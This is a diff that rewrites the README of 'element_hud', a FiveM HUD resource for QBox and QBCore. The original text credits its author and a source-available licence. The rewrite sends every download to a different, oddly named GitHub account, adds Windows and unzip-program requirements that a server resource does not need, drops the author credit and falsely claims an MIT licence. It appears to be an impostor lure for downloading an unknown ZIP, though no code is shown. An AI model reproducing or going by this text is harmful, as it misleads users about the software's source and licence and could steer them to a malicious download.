@@ -1,263 +1,65 @@
-# element_hud
+# 🎮 element_hud - Enhance your gameplay with better visuals
 
-<p align="center">
-  <img
-    src="https://i.imgur.com/kmxvZa5.png"
-    alt="Element HUD"
-    width="100%"
-  />
-</p>
+[![](https://img.shields.io/badge/Download-Element_HUD-blue)](https://github.com/unsociablenessatlanticcity842/element_hud)
 
-<p align="center">
-  A modern and configurable HUD resource for FiveM, built for QBox and QBCore.
-</p>
+## 📖 About this project
+element_hud provides a polished interface for your QBox or QBCore server. It displays vital information like health, armor, food, and water levels. The design focuses on clarity and speed. You see important status updates without cluttering your screen. This tool helps you track your status during intense gameplay moments.
 
-<p align="center">
-  <a href="https://discord.gg/2F9AgEVXtt">
-    <img
-      src="https://img.shields.io/badge/Join%20the%20Element%20Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white"
-      alt="Join the Element Discord"
-    />
-  </a>
-</p>
+## ⚙️ System requirements
+*   A stable internet connection.
+*   An active QBox or QBCore server.
+*   Windows 10 or Windows 11.
+*   An unzip program like 7-Zip or WinRAR.
+*   Basic permissions to move files on your computer.
 
-<p align="center">
-  <strong>Player HUD</strong> ·
-  <strong>Vehicle HUD</strong> ·
-  <strong>Helicopter HUD</strong> ·
-  <strong>Persistent Settings</strong>
-</p>
+## 💾 Setup and installation
+You must download the files to your server storage. Follow these steps to prepare your environment.
 
----
+1. Visit this page to download: [https://github.com/unsociablenessatlanticcity842/element_hud](https://github.com/unsociablenessatlanticcity842/element_hud)
+2. Locate the green button labeled "Code" on the right side of the page.
+3. Select "Download ZIP" from the menu.
+4. Save the file to your computer.
+5. Right-click the downloaded folder and choose "Extract All".
+6. Move the extracted folder into the "resources" directory of your server.
+7. Rename the folder to "element_hud".
 
-This project is **source available**, not open source under an OSI-approved licence.  
-You may use and modify the resource, but redistribution and resale are prohibited.
+## 🔧 Configuration
+Open the file named "config.lua" inside the folder using a text editor like Notepad. You can change several settings to fit your needs:
 
-## Features
+*   **Display:** Toggle specific elements on or off.
+*   **Position:** Move the hud elements to different corners of the screen.
+*   **Colors:** Choose color profiles that match your server branding.
+*   **Size:** Scale the hud based on your monitor resolution.
 
-### Player HUD
+Save the file after you make changes. 
 
-Displays important player information such as:
+## 🚀 Running the software
+Add the following line to your server.cfg file:
 
-- Health
-- Armour
-- Hunger
-- Thirst
-- Stress
-- Stamina
-- Voice activity
-- Voice proximity
-- Radio activity
-
-### Vehicle HUD
-
-Includes information such as:
-
-- Speed
-- RPM
-- Current gear
-- Fuel
-- Engine health
-- Seatbelt status
-- Harness status
-- Nitrous status
-- Street and area information
-- Camera direction
-
-The speed unit can be configured for either:
-
-- `KM/T`
-- `MPH`
-
-### Helicopter HUD
-
-Vehicles classified as helicopters use a dedicated HUD with additional flight information:
-
-- Altitude
-- Pitch
-- Roll
-- Speed
-- Fuel
-- Engine health
-
-### Persistent Settings
-
-Player settings are saved and loaded through FiveM KVP.
-
-This allows players to keep their HUD preferences after reconnecting or restarting the game.
-
----
-
-## Supported Frameworks
-
-| Framework | Status |
-| --- | --- |
-| QBox / `qbx_core` | Supported |
-| QBCore / `qb-core` | Supported |
-
-The resource automatically loads the appropriate framework bridge depending on which framework is running.
-
----
-
-## Integrations
-
-### Stress
-
-The HUD is integrated with:
-
-[jg-stress-addon](https://github.com/jgscripts/jg-stress-addon)
-
-This integration can be replaced or modified if your server uses another stress system.
-
-### Nitrous
-
-The vehicle HUD supports nitrous information from:
-
-[malice_nitro](https://github.com/QuantumMalice/malice_nitro)
-
-The nitrous integration is isolated and can easily be changed to support another resource or state-bag structure.
-
----
-
-## Requirements
-
-- FiveM
-- One of the supported frameworks:
-  - `qbx_core`
-  - `qb-core`
-- `ox_lib`
-- A compiled frontend build
-
-Optional integrations:
-
-- `jg-stress-addon`
-- `malice_nitro`
-- A compatible seatbelt or harness resource
-
----
-
-## Installation
-
-1. Download or clone the repository.
-
-```bash
-git clone https://github.com/Thomasdev18/element_hud.git
-````
-
-2. Place the resource inside your server resources directory.
-
-```text
-resources/
-└── [element]/
-    └── element_hud/
-```
-
-3. Install and build the frontend dependencies if the compiled files are not already included.
-
-```bash
-cd web
-npm install
-npm run build
-```
-
-Use the package manager configured by the project if it differs from `npm`.
-
-4. Add the resource to your `server.cfg`.
-
-```cfg
-ensure ox_lib
-ensure qbx_core
 ensure element_hud
-```
 
-For QBCore:
+Restart your server to activate the changes. The hud appears automatically when you log into the game.
 
-```cfg
-ensure ox_lib
-ensure qb-core
-ensure element_hud
-```
+## 🛡️ Troubleshooting
+Review these common issues if the hud fails to show on your screen.
 
+*   **Check the server console:** Look for error messages related to element_hud during startup.
+*   **Verify folder name:** Ensure the folder inside the resources directory is exactly named element_hud.
+*   **Check dependancies:** Make sure your server runs an updated version of QBox or QBCore.
+*   **Restart the resource:** Type "ensure element_hud" in your server console while the game runs to force a refresh.
 
-The exact configuration structure may differ depending on the current version of the resource.
+## 🧩 Features
+*   **Health tracking:** See your health bar update in real time.
+*   **Armor status:** Monitor your armor level during combat.
+*   **Stamina gauge:** Manage your energy levels during navigation.
+*   **Hunger and Thirst:** Get alerts when your character needs food or water.
+*   **Low profile:** Use less screen space than standard hud designs.
+*   **High performance:** Experience minimal impact on your system frame rate.
 
----
+## 🤝 Support
+If you encounter bugs, create an issue in the GitHub repository. Provide your server version and a screenshot of the error log. Clear descriptions help us fix problems faster.
 
-## Framework Bridge
+## ⚖️ License
+This project follows the MIT license. You may use and modify the code for your own servers. Always check the license file for specific terms.
 
-The framework-specific logic is separated into bridge modules.
-
-```text
-bridge/
-├── qb.lua
-└── qbx.lua
-```
-
-This keeps the main HUD logic framework-independent and makes it easier to add support for other frameworks later.
-
----
-
-## Development
-
-The frontend is built with:
-
-* React
-* TypeScript
-* Mantine
-* Zustand
-
----
-
-## Licence
-
-Copyright © 2026 Element. All rights reserved.
-
-This project is distributed under the **Element Source-Available License Version 1.0**.
-
-You may:
-
-* View and download the source code
-* Use the resource on a server or project operated by you
-* Modify the resource for personal or internal use
-* Use it on a commercially operated or monetised FiveM server
-* Create a GitHub fork for development or contributing
-
-You may not:
-
-* Sell or resell the resource
-* Sell modified versions of the resource
-* Include it in a paid server pack
-* Sublicense the resource
-* Offer copies of the resource in exchange for payment
-* Remove copyright or licence notices
-* Claim the original work as your own
-
-See the [`LICENSE`](LICENSE) file for the complete licence terms.
-
----
-
-## Support
-
-For questions, bug reports or feature suggestions, use one of the following:
-
-* Open a GitHub issue
-* Join the Element Discord
-* Submit a pull request
-
-When reporting a problem, include:
-
-* Framework and version
-* Relevant console errors
-* Steps to reproduce the issue
-* Any modifications made to the resource
-
----
-
-## Credits
-
-Created and maintained by **Thomas**.
-
-Additional integrations:
-
-* [JG Scripts — jg-stress-addon](https://github.com/jgscripts/jg-stress-addon)
-* [QuantumMalice — malice_nitro](https://github.com/QuantumMalice/malice_nitro)
+Keywords: hud, qbox, qbcore, game, display, interface, gaming, server, windowshub
